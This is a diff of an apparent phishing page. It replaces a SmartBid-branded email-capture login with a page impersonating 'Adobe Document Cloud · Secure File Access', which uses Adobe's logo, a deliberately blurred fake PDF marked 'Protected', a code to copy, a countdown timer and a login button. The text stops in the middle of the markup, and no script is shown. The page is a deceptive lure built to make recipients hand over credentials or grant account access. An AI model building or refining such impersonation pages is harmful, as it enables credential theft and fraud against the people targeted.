@@ -1,397 +1,1255 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>SmartBid by ConstructConnect</title>
-  <link rel="icon" href="https://gocc.smartbid.co/sb.ico" type="image/x-icon" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;600;700&display=swap" rel="stylesheet" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adobe Document Cloud · Secure File Access</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='5' fill='%23FA0F00'/%3E%3Cpath d='M13.966 22.624l-1.69-4.281H8.122l3.892-9.144 5.662 13.425zM8.884 1.376H0v21.248zm15.116 0h-8.884L24 22.624z' fill='%23fff'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  :root {
+    --adobe-red: #FA0F00;
+    --adobe-red-dark: #C00000;
+    --adobe-red-deep: #8A0000;
+    --adobe-red-light: #FF4D4D;
+    --adobe-red-soft: #FFB3B3;
+    --adobe-dark: #1A1A1A;
+    --adobe-charcoal: #2C2C2C;
+    --adobe-grey: #F7F7F7;
+    --adobe-grey-line: #E5E5E5;
+    --adobe-ink: #1A1A1A;
+    --adobe-ink-soft: #6E6E6E;
+    --green-ok: #1F8A44;
+  }
 
-  <style>
-    *, *::before, *::after {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
 
-    html, body {
-      height: 100%;
-      overflow: hidden;
-      font-family: 'Source Sans 3', 'Segoe UI', sans-serif;
-    }
+  body {
+    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+    background: var(--adobe-grey);
+    color: var(--adobe-ink);
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
 
-    body {
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      position: relative;
-      overflow: hidden;
-    }
+  .portal {
+    display: flex;
+    min-height: 100vh;
+    position: relative;
+  }
 
-    .bg {
-      position: fixed;
-      inset: 0;
-      background-image: url('https://gocc.smartbid.co/Scripts/Images/SI-System-Login-2017-BG.jpg');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      z-index: 0;
-    }
+  /* ============ LEFT VAULT PANEL ============ */
+  .vault {
+    width: 36%;
+    min-width: 320px;
+    background: linear-gradient(165deg, #1A1A1A 0%, #0A0A0A 60%, #000000 100%);
+    color: #E8E8E8;
+    padding: 44px 40px;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    overflow: hidden;
+    flex-shrink: 0;
+    z-index: 3;
+    box-shadow:
+      6px 0 28px -6px rgba(0, 0, 0, 0.28),
+      2px 0 8px -2px rgba(0, 0, 0, 0.18);
+  }
+  .vault::before {
+    content: "";
+    position: absolute;
+    top: -20%; right: -30%;
+    width: 500px; height: 500px;
+    background: radial-gradient(circle, rgba(250,15,0,.20), transparent 60%);
+    pointer-events: none;
+  }
+  .vault::after {
+    content: "";
+    position: absolute;
+    bottom: -30%; left: -30%;
+    width: 500px; height: 500px;
+    background: radial-gradient(circle, rgba(192,0,0,.18), transparent 60%);
+    pointer-events: none;
+  }
+  .vault .edge {
+    position: absolute;
+    top: 0; bottom: 0; right: 0;
+    width: 1px;
+    background: linear-gradient(180deg,
+      transparent 0%,
+      rgba(250,15,0,0.28) 18%,
+      rgba(250,15,0,0.34) 50%,
+      rgba(250,15,0,0.28) 82%,
+      transparent 100%);
+    pointer-events: none;
+    z-index: 4;
+  }
 
-    .bg-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(20, 20, 20, 0.55);
-      z-index: 1;
-    }
+  .vault-brand {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    position: relative;
+    z-index: 1;
+  }
+  .vault-brand .mark {
+    width: 30px; height: 30px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .vault-brand .mark svg { width: 100%; height: 100%; display: block; }
+  .vault-brand .name {
+    font-size: 12.5px;
+    letter-spacing: .14em;
+    text-transform: uppercase;
+    color: #E8E8E8;
+    font-weight: 600;
+  }
+  .vault-brand .name span { color: #8A8A8A; font-weight: 400; }
 
-    .lang-bar {
-      position: fixed;
-      top: 16px;
-      right: 20px;
-      display: flex;
-      gap: 8px;
-      z-index: 10;
-    }
+  /* ============ BLURRED PDF PREVIEW ============ */
+  .vault-doc {
+    margin-top: 40px;
+    position: relative;
+    z-index: 1;
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 0;
+    padding: 8px 0;
+  }
 
-    .lang-flag {
-      width: 36px;
-      height: 36px;
-      border-radius: 50%;
-      overflow: hidden;
-      cursor: pointer;
-      border: 2px solid rgba(255,255,255,0.3);
-      transition: border-color 0.2s, transform 0.15s;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.35);
-    }
+  .pdf-wrap {
+    width: 100%;
+    max-width: 270px;
+    position: relative;
+    margin: 0 auto;
+    isolation: isolate;
+  }
 
-    .lang-flag:hover {
-      border-color: rgba(255,255,255,0.75);
-      transform: scale(1.08);
-    }
+  /* Soft pulsing red halo behind the page */
+  .pdf-wrap::before {
+    content: "";
+    position: absolute;
+    inset: -34px;
+    background: radial-gradient(ellipse at center,
+      rgba(250,15,0,0.22) 0%,
+      rgba(250,15,0,0.08) 40%,
+      transparent 72%);
+    filter: blur(24px);
+    z-index: -1;
+    pointer-events: none;
+    animation: pdfHaloPulse 5.5s ease-in-out infinite;
+  }
+  @keyframes pdfHaloPulse {
+    0%, 100% { opacity: 0.75; transform: scale(1); }
+    50%      { opacity: 1;    transform: scale(1.06); }
+  }
 
-    .lang-flag img {
+  /* The blurred PDF page */
+  .pdf-page {
+    width: 100%;
+    aspect-ratio: 1 / 1.3;
+    max-height: 380px;
+    background: linear-gradient(180deg, #FFFFFF 0%, #F2F2F2 100%);
+    border-radius: 8px;
+    padding: 22px 20px;
+    filter: blur(10px) contrast(0.94) saturate(0.85);
+    opacity: 0.55;
+    box-shadow:
+      0 24px 55px rgba(0,0,0,0.6),
+      0 0 0 1px rgba(255,255,255,0.06),
+      0 0 60px rgba(250,15,0,0.10);
+    overflow: hidden;
+    position: relative;
+    transform: rotate(-1.2deg);
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    user-select: none;
+  }
+
+  /* Fades the page edges into the dark vault */
+  .pdf-page::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse at center, transparent 30%, rgba(10,10,10,0.22) 100%);
+    pointer-events: none;
+  }
+
+  /* --- Fake content inside the PDF --- */
+  .pdf-head {
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    margin-bottom: 4px;
+  }
+  .pdf-mini-logo {
+    width: 18px;
+    height: 18px;
+    background: #FA0F00;
+    border-radius: 3px;
+    flex-shrink: 0;
+    position: relative;
+  }
+  .pdf-mini-logo::after {
+    content: "";
+    position: absolute;
+    inset: 4px;
+    background: #fff;
+    clip-path: polygon(50% 0%, 100% 100%, 78% 100%, 50% 48%, 22% 100%, 0% 100%);
+  }
+  .pdf-head-lines {
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    flex: 1;
+  }
+
+  .pdf-line {
+    height: 6px;
+    background: #C8C8C8;
+    border-radius: 3px;
+  }
+  .pdf-line.title {
+    height: 12px;
+    background: #8A8A8A;
+    border-radius: 2px;
+  }
+  .pdf-line.accent {
+    height: 4px;
+    background: #FA0F00;
+    opacity: 0.7;
+    border-radius: 2px;
+  }
+  .pdf-line.w-100 { width: 100%; }
+  .pdf-line.w-95  { width: 95%; }
+  .pdf-line.w-90  { width: 90%; }
+  .pdf-line.w-85  { width: 85%; }
+  .pdf-line.w-80  { width: 80%; }
+  .pdf-line.w-70  { width: 70%; }
+  .pdf-line.w-60  { width: 60%; }
+  .pdf-line.w-40  { width: 40%; }
+  .pdf-line.w-30  { width: 30%; }
+  .pdf-line.w-20  { width: 20%; }
+
+  .pdf-divider {
+    height: 1.5px;
+    background: #D4D4D4;
+    margin: 3px 0;
+  }
+
+  .pdf-block {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+
+  .pdf-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    margin: 3px 0;
+  }
+  .pdf-grid-item {
+    height: 26px;
+    background: #E2E2E2;
+    border-radius: 3px;
+  }
+
+  .pdf-footer {
+    margin-top: auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding-top: 9px;
+    border-top: 1px solid #E0E0E0;
+    gap: 8px;
+  }
+
+  /* Lock chip floating at the page edge */
+  .pdf-lock-chip {
+    position: absolute;
+    bottom: 12px;
+    right: -6px;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 11px;
+    background: rgba(250,15,0,0.94);
+    color: #fff;
+    font-size: 9.5px;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    border-radius: 20px;
+    box-shadow: 0 6px 18px rgba(250,15,0,0.45);
+    z-index: 6;
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+  }
+  .pdf-lock-chip i {
+    font-size: 9px;
+  }
+
+  /* ============ ACCESS FLOW ============ */
+  .access-flow {
+    margin-top: 36px;
+    padding-top: 28px;
+    border-top: 1px solid rgba(250,15,0,.18);
+    position: relative;
+    z-index: 1;
+  }
+  .flow-title {
+    font-size: 10.5px;
+    letter-spacing: .22em;
+    text-transform: uppercase;
+    color: var(--adobe-red-light);
+    font-weight: 700;
+    margin-bottom: 18px;
+  }
+  .flow-step {
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    padding-bottom: 16px;
+    position: relative;
+  }
+  .flow-step:not(:last-child)::after {
+    content: "";
+    position: absolute;
+    left: 11px;
+    top: 24px;
+    bottom: 0;
+    width: 1px;
+    background: rgba(250,15,0,.25);
+  }
+  .flow-step .num {
+    width: 23px; height: 23px;
+    border-radius: 50%;
+    border: 1.5px solid rgba(250,15,0,.4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    font-weight: 700;
+    color: #9A9A9A;
+    flex-shrink: 0;
+    background: rgba(0,0,0,.9);
+    position: relative;
+    z-index: 1;
+  }
+  .flow-step.complete .num {
+    background: var(--adobe-red);
+    border-color: var(--adobe-red);
+    color: #FFFFFF;
+  }
+  .flow-step.active .num {
+    border-color: var(--adobe-red);
+    color: var(--adobe-red-light);
+    box-shadow: 0 0 0 4px rgba(250,15,0,.18);
+    animation: flowPulse 2s infinite;
+  }
+  @keyframes flowPulse {
+    0%, 100% { box-shadow: 0 0 0 4px rgba(250,15,0,.18); }
+    50% { box-shadow: 0 0 0 6px rgba(250,15,0,.08); }
+  }
+  .flow-step .txt { padding-top: 1px; }
+  .flow-step .step-name {
+    font-size: 12.5px;
+    color: #E8E8E8;
+    font-weight: 600;
+    margin-bottom: 2px;
+  }
+  .flow-step.pending .step-name { color: #7A7A7A; }
+  .flow-step .step-desc {
+    font-size: 11px;
+    color: #7A7A7A;
+    line-height: 1.45;
+  }
+  .flow-step.active .step-desc { color: var(--adobe-red-light); }
+
+  /* ============ RIGHT PERMISSION PANEL ============ */
+  .permission {
+    flex: 1;
+    background: var(--adobe-grey);
+    display: flex;
+    flex-direction: column;
+    min-width: 0;
+    position: relative;
+    z-index: 1;
+    box-shadow: inset 30px 0 40px -34px rgba(0,0,0,0.10);
+  }
+
+  .perm-topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 18px 48px;
+    border-bottom: 1px solid var(--adobe-grey-line);
+    font-size: 11.5px;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--adobe-ink-soft);
+    font-weight: 500;
+    background: linear-gradient(90deg, #F4F4F4 0%, #FFFFFF 8%, #FFFFFF 100%);
+    position: relative;
+  }
+  .perm-topbar .secure-tag {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    color: var(--green-ok);
+  }
+  .perm-topbar .secure-tag .dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--green-ok);
+    box-shadow: 0 0 0 3px rgba(31,138,68,.15);
+  }
+  .perm-topbar .brand-line {
+    display: inline-flex;
+    align-items: center;
+    gap: 9px;
+    color: var(--adobe-ink);
+    font-weight: 600;
+    letter-spacing: .14em;
+  }
+  .perm-topbar .brand-line .mini-a {
+    width: 15px; height: 15px;
+  }
+
+  .perm-content {
+    flex: 1;
+    max-width: 520px;
+    margin: 0 auto;
+    padding: 56px 40px 40px;
+    width: 100%;
+  }
+
+  .perm-eyebrow {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 10.5px;
+    letter-spacing: .22em;
+    text-transform: uppercase;
+    color: var(--adobe-red);
+    font-weight: 700;
+    margin-bottom: 18px;
+    padding: 5px 12px;
+    background: rgba(250,15,0,.07);
+    border: 1px solid rgba(250,15,0,.25);
+    border-radius: 3px;
+  }
+  .perm-eyebrow .dot {
+    width: 5px; height: 5px;
+    border-radius: 50%;
+    background: var(--adobe-red);
+    animation: pulseDot 1.8s ease-in-out infinite;
+  }
+  @keyframes pulseDot {
+    0%, 100% { opacity: 1; }
+    50% { opacity: .35; }
+  }
+
+  .perm-content h1 {
+    font-size: clamp(28px, 3.2vw, 36px);
+    font-weight: 700;
+    line-height: 1.2;
+    color: var(--adobe-ink);
+    letter-spacing: -.025em;
+    margin-bottom: 16px;
+  }
+  .perm-content h1 em {
+    font-style: normal;
+    color: var(--adobe-red);
+  }
+
+  .perm-lead {
+    font-size: 14.5px;
+    line-height: 1.65;
+    color: var(--adobe-ink-soft);
+    margin-bottom: 34px;
+    max-width: 440px;
+  }
+
+  .code-panel {
+    margin-bottom: 22px;
+    position: relative;
+    transition: opacity .2s;
+  }
+
+  .cp-code {
+    font-family: 'SF Mono', 'Consolas', 'Courier New', monospace;
+    background: linear-gradient(180deg, #FFFFFF 0%, #FDFBFB 100%);
+    border: 1.5px dashed var(--adobe-red-soft);
+    border-radius: 8px;
+    padding: 26px 24px;
+    text-align: center;
+    font-size: 30px;
+    font-weight: 700;
+    letter-spacing: 8px;
+    color: var(--adobe-red);
+    min-height: 96px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+    word-break: break-all;
+    transition: border-color .3s, background .3s;
+    box-shadow: 0 2px 12px rgba(250,15,0,.06);
+  }
+  .cp-code::before, .cp-code::after {
+    content: "";
+    position: absolute;
+    width: 14px; height: 14px;
+    background: var(--adobe-grey);
+    border-radius: 50%;
+    top: 50%;
+    transform: translateY(-50%);
+    border: 1.5px dashed var(--adobe-red-soft);
+  }
+  .cp-code::before { left: -7px; }
+  .cp-code::after { right: -7px; }
+
+  .cp-code.loading {
+    font-family: 'Segoe UI', sans-serif;
+    font-size: 13px;
+    letter-spacing: .04em;
+    color: var(--adobe-ink-soft);
+    font-weight: 500;
+    border-style: solid;
+    border-color: var(--adobe-grey-line);
+  }
+  .cp-code.loading::before, .cp-code.loading::after {
+    border-color: var(--adobe-grey-line);
+  }
+
+  .code-panel.is-loading::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(100deg, transparent 30%, rgba(255,255,255,.7) 50%, transparent 70%);
+    animation: shimmer 1.6s infinite;
+    pointer-events: none;
+    border-radius: 8px;
+  }
+  @keyframes shimmer {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+  }
+
+  .code-actions {
+    display: flex;
+    gap: 10px;
+    margin-top: 10px;
+  }
+  .code-actions button {
+    flex: 1;
+    padding: 11px 14px;
+    border-radius: 6px;
+    font-size: 12.5px;
+    font-weight: 600;
+    cursor: pointer;
+    font-family: inherit;
+    border: 1px solid var(--adobe-grey-line);
+    background: #FFFFFF;
+    color: var(--adobe-ink);
+    transition: all .15s;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    letter-spacing: .01em;
+  }
+  .code-actions button:hover:not(:disabled) {
+    border-color: var(--adobe-red-soft);
+    background: #FFF9F9;
+    color: var(--adobe-red);
+  }
+  .code-actions button:active:not(:disabled) { transform: translateY(1px); }
+  .code-actions button:disabled { opacity: .5; cursor: not-allowed; }
+
+  #copyBtn.copied {
+    background: #E8F6EC;
+    border-color: #B8DEC5;
+    color: var(--green-ok);
+  }
+
+  #refreshBtn {
+    flex: 0 0 auto;
+    padding-left: 20px;
+    padding-right: 20px;
+  }
+  #refreshBtn.spinning i { animation: spin .8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  #loginBtn {
+    width: 100%;
+    padding: 17px 24px;
+    background: linear-gradient(180deg, #FA0F00 0%, #C00000 100%);
+    color: #FFFFFF;
+    border: none;
+    border-radius: 8px;
+    font-size: 14.5px;
+    font-weight: 600;
+    font-family: inherit;
+    cursor: pointer;
+    letter-spacing: .02em;
+    box-shadow: 0 8px 20px rgba(250,15,0,.28), inset 0 1px 0 rgba(255,255,255,.15);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    transition: all .18s;
+    position: relative;
+    overflow: hidden;
+  }
+  #loginBtn::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,.2), transparent);
+    transform: translateX(-100%);
+    transition: transform .5s;
+  }
+  #loginBtn:hover:not(:disabled)::before { transform: translateX(100%); }
+  #loginBtn:hover:not(:disabled) {
+    box-shadow: 0 12px 26px rgba(250,15,0,.4), inset 0 1px 0 rgba(255,255,255,.2);
+    filter: brightness(1.05);
+  }
+  #loginBtn:active:not(:disabled) { transform: translateY(1px); }
+  #loginBtn:disabled {
+    background: #D6D6D6;
+    color: #8A8A8A;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+  #loginBtn .arrow { transition: transform .2s; }
+  #loginBtn:hover:not(:disabled) .arrow { transform: translateX(3px); }
+
+  .status-msg {
+    margin-top: 14px;
+    padding: 11px 14px;
+    border-radius: 6px;
+    font-size: 12.5px;
+    display: none;
+    line-height: 1.5;
+    border: 1px solid transparent;
+    animation: fadeIn .25s ease;
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-4px); }
+    to { opacity: 1; transform: none; }
+  }
+  .status-msg.show { display: flex; align-items: center; gap: 9px; }
+  .status-msg.error { background: #FBEDED; color: #A83232; border-color: #F0CDCD; }
+  .status-msg.success { background: #E8F6EC; color: var(--green-ok); border-color: #B8DEC5; }
+  .status-msg.info { background: #F5F5F5; color: var(--adobe-charcoal); border-color: #E0E0E0; }
+
+  .timer-row {
+    margin-top: 22px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    font-size: 12px;
+    color: var(--adobe-ink-soft);
+  }
+  .timer-row .label {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    letter-spacing: .06em;
+    text-transform: uppercase;
+    font-weight: 500;
+    font-size: 10.5px;
+  }
+  .timer-row .label i { color: var(--adobe-red); font-size: 11px; }
+  #timer {
+    font-family: 'SF Mono', 'Consolas', monospace;
+    font-weight: 700;
+    color: var(--adobe-red);
+    font-variant-numeric: tabular-nums;
+    font-size: 13px;
+  }
+  #timer.low {
+    color: #A83232;
+    animation: blink 1s step-end infinite;
+  }
+  @keyframes blink { 50% { opacity: .3; } }
+
+  .timer-bar {
+    flex: 1;
+    height: 4px;
+    background: var(--adobe-grey-line);
+    border-radius: 2px;
+    overflow: hidden;
+    max-width: 160px;
+  }
+  .timer-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--adobe-red-dark), var(--adobe-red));
+    transition: width 1s linear, background .3s;
+    border-radius: 2px;
+  }
+  .timer-fill.low {
+    background: linear-gradient(90deg, #C75353, #A83232);
+  }
+
+  .perm-footer {
+    padding: 20px 48px;
+    border-top: 1px solid var(--adobe-grey-line);
+    font-size: 11.5px;
+    color: var(--adobe-ink-soft);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 16px;
+    flex-wrap: wrap;
+    background: linear-gradient(90deg, #F4F4F4 0%, #FFFFFF 8%, #FFFFFF 100%);
+  }
+  .perm-footer .lock-line {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+  }
+  .perm-footer .lock-line i { color: var(--adobe-red); }
+  .perm-footer .policy-link {
+    color: var(--adobe-ink-soft);
+    text-decoration: none;
+    border-bottom: 1px dotted var(--adobe-grey-line);
+    padding-bottom: 1px;
+  }
+  .perm-footer .policy-link:hover {
+    color: var(--adobe-red);
+    border-bottom-color: var(--adobe-red);
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translate(-50%, 90px);
+    background: var(--adobe-dark);
+    color: #F5F5F5;
+    padding: 13px 24px;
+    border-radius: 8px;
+    font-size: 13px;
+    font-weight: 500;
+    box-shadow: 0 12px 40px rgba(0,0,0,.4);
+    opacity: 0;
+    transition: all .3s cubic-bezier(.2,.8,.3,1);
+    z-index: 10000;
+    pointer-events: none;
+    border: 1px solid var(--adobe-charcoal);
+    max-width: 90vw;
+    text-align: center;
+  }
+  .toast.show {
+    transform: translate(-50%, 0);
+    opacity: 1;
+  }
+
+  @media (max-width: 960px) {
+    .portal { flex-direction: column; }
+    .vault {
       width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
+      min-width: 0;
+      padding: 32px 28px;
+      box-shadow: 0 6px 24px -6px rgba(0,0,0,0.28);
     }
+    .vault .edge { display: none; }
+    .permission { box-shadow: none; }
+    .vault-doc { margin-top: 28px; padding: 4px 0; }
+    .pdf-wrap { max-width: 220px; }
+    .access-flow { display: none; }
+    .perm-topbar { padding: 14px 28px; background: #FFFFFF; }
+    .perm-content { padding: 36px 24px 32px; }
+    .perm-footer { padding: 16px 24px; background: #FFFFFF; }
+    .cp-code { font-size: 24px; letter-spacing: 5px; padding: 22px 16px; min-height: 82px; }
+  }
+  @media (max-width: 520px) {
+    .perm-content h1 { font-size: 24px; }
+    .perm-content { padding: 28px 20px 24px; }
+    .code-actions { flex-wrap: wrap; }
+    #refreshBtn { flex: 1; }
+    .cp-code { font-size: 20px; letter-spacing: 4px; padding: 18px 12px; min-height: 72px; }
+  }
 
-    .page {
-      position: relative;
-      z-index: 2;
-      display: flex;
-      flex: 1;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      gap: 80px;
-      overflow: hidden;
+  /* Respect users who prefer reduced motion */
+  @media (prefers-reduced-motion: reduce) {
+    .pdf-wrap::before,
+    .perm-eyebrow .dot,
+    .flow-step.active .num,
+    #timer.low {
+      animation: none !important;
     }
-
-    .logo-side {
-      flex: 0 0 auto;
-    }
-
-    .logo-img {
-      width: 340px;
-      max-width: 90vw;
-      display: block;
-      filter: drop-shadow(0 4px 20px rgba(0,0,0,0.5));
-    }
-
-    .login-panel {
-      flex: 0 0 auto;
-      width: 480px;
-      max-width: 95vw;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 16px;
-    }
-
-    .access-key-row {
-      width: 100%;
-      display: flex;
-      align-items: center;
-      background: rgba(255, 255, 255, 0.92);
-      border-radius: 4px;
-      overflow: hidden;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.25);
-    }
-
-    .access-key-input {
-      flex: 1;
-      padding: 14px 16px;
-      font-size: 15px;
-      font-family: inherit;
-      color: #444;
-      background: transparent;
-      border: none;
-      outline: none;
-    }
-
-    .access-key-input::placeholder {
-      color: #aaa;
-    }
-
-    .required-star {
-      padding: 0 14px;
-      color: #d9534f;
-      font-size: 18px;
-      line-height: 1;
-    }
-
-    .login-btn {
-      background: #2fa8d4;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      padding: 13px 48px;
-      font-size: 15px;
-      font-weight: 700;
-      font-family: inherit;
-      letter-spacing: 1.5px;
-      text-transform: uppercase;
-      cursor: pointer;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.25);
-      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
-      align-self: flex-end;
-    }
-
-    .login-btn:hover {
-      background: #2190b8;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.3);
-      transform: translateY(-1px);
-    }
-
-    .login-btn:active {
-      transform: translateY(0);
-      background: #1a7da0;
-    }
-
-    .invite-text {
-      text-align: center;
-      color: #fff;
-      padding-top: 10px;
-    }
-
-    .invite-text h2 {
-      font-size: 22px;
-      font-weight: 700;
-      margin-bottom: 10px;
-      text-shadow: 0 1px 6px rgba(0,0,0,0.4);
-    }
-
-    .invite-text p {
-      font-size: 15px;
-      font-weight: 600;
-      line-height: 1.55;
-      text-shadow: 0 1px 4px rgba(0,0,0,0.4);
-    }
-
-    .error-msg {
-      width: 100%;
-      background: rgba(217, 83, 79, 0.88);
-      color: #fff;
-      font-size: 13.5px;
-      font-weight: 600;
-      padding: 10px 14px;
-      border-radius: 4px;
-      text-align: center;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-      display: none;
-    }
-
-    footer {
-      position: relative;
-      z-index: 2;
-      background: rgba(40, 50, 60, 0.75);
-      text-align: center;
-      padding: 14px 20px;
-    }
-
-    footer a {
-      color: rgba(200,210,220,0.85);
-      text-decoration: none;
-      font-size: 12.5px;
-      transition: color 0.2s;
-    }
-
-    footer a:hover {
-      color: #fff;
-      text-decoration: underline;
-    }
-
-    .footer-links {
-      display: flex;
-      justify-content: center;
-      gap: 0;
-      flex-wrap: wrap;
-      margin-bottom: 4px;
-    }
-
-    .footer-links span {
-      color: rgba(200,210,220,0.5);
-      font-size: 12.5px;
-      margin: 0 8px;
-    }
-
-    .footer-copy {
-      color: rgba(200,210,220,0.65);
-      font-size: 12px;
-    }
-
-    @media (max-width: 760px) {
-      .page {
-        flex-direction: column;
-        gap: 36px;
-        padding-top: 80px;
-      }
-
-      .logo-img {
-        width: 240px;
-      }
-
-      .login-panel {
-        width: 100%;
-        max-width: 420px;
-      }
-
-      .login-btn {
-        align-self: center;
-        width: 100%;
-      }
-    }
-  </style>
+  }
+</style>
 </head>
-
 <body>
 
-  <div class="bg"></div>
-  <div class="bg-overlay"></div>
+<div class="portal">
 
-  <!-- Language flags -->
-  <div class="lang-bar">
-    <div class="lang-flag" title="English">
-      <img src="https://flagcdn.com/us.svg" alt="English" />
-    </div>
-    <div class="lang-flag" title="Español">
-      <img src="https://flagcdn.com/es.svg" alt="Español" />
-    </div>
-    <div class="lang-flag" title="Français">
-      <img src="https://flagcdn.com/fr.svg" alt="Français" />
-    </div>
-  </div>
+  <!-- ============ LEFT VAULT PANEL ============ -->
+  <aside class="vault">
+    <div class="edge" aria-hidden="true"></div>
 
-  <!-- Main content -->
-  <main class="page">
-
-    <div class="logo-side">
-      <img
-        class="logo-img"
-        src="https://gocc.smartbid.co/Scripts/Images/SB-CC-Logo-login.svg?nocache=2.2.5.19"
-        alt="SmartBid by ConstructConnect"
-      />
+    <div class="vault-brand">
+      <div class="mark">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Adobe">
+          <path fill="#FA0F00" d="M13.966 22.624l-1.69-4.281H8.122l3.892-9.144 5.662 13.425zM8.884 1.376H0v21.248zm15.116 0h-8.884L24 22.624z"/>
+        </svg>
+      </div>
+      <div class="name">Adobe <span>Document Cloud</span></div>
     </div>
 
-    <div class="login-panel">
+    <div class="vault-doc">
+      <!-- ===== BLURRED PDF PREVIEW ===== -->
+      <div class="pdf-wrap" aria-label="Protected document preview">
+        <div class="pdf-page" aria-hidden="true">
+          <!-- Header: mini logo + two small lines -->
+          <div class="pdf-head">
+            <div class="pdf-mini-logo"></div>
+            <div class="pdf-head-lines">
+              <div class="pdf-line w-70"></div>
+              <div class="pdf-line w-40"></div>
+            </div>
+          </div>
 
-      <div class="error-msg" id="error-msg"></div>
+          <!-- Big title + accent -->
+          <div class="pdf-line title w-85"></div>
+          <div class="pdf-line accent w-30"></div>
 
-      <form id="login-form" style="width:100%; display:flex; flex-direction:column; align-items:center; gap:16px;">
+          <div class="pdf-divider"></div>
 
-        <div class="access-key-row">
-          <input
-            class="access-key-input"
-            type="email"
-            name="email"
-            placeholder="Enter your Email"
-            autocomplete="email"
-            spellcheck="false"
-          />
-          <span class="required-star">&#10033;</span>
+          <!-- Paragraph 1 -->
+          <div class="pdf-block">
+            <div class="pdf-line w-100"></div>
+            <div class="pdf-line w-95"></div>
+            <div class="pdf-line w-100"></div>
+            <div class="pdf-line w-80"></div>
+          </div>
+
+          <!-- Info grid (data cells) -->
+          <div class="pdf-grid">
+            <div class="pdf-grid-item"></div>
+            <div class="pdf-grid-item"></div>
+            <div class="pdf-grid-item"></div>
+            <div class="pdf-grid-item"></div>
+          </div>
+
+          <!-- Paragraph 2 -->
+          <div class="pdf-block">
+            <div class="pdf-line w-100"></div>
+            <div class="pdf-line w-90"></div>
+            <div class="pdf-line w-100"></div>
+            <div class="pdf-line w-70"></div>
+            <div class="pdf-line w-85"></div>
+          </div>
+
+          <!-- Footer row -->
+          <div class="pdf-footer">
+            <div class="pdf-line w-30"></div>
+            <div class="pdf-line w-20"></div>
+          </div>
         </div>
 
-        <button type="submit" class="login-btn">CONTINUE</button>
+        <!-- Lock chip overlapping the page edge -->
+        <div class="pdf-lock-chip">
+          <i class="fas fa-lock"></i>
+          <span>Protected</span>
+        </div>
+      </div>
+    </div>
 
-      </form>
+    <div class="access-flow">
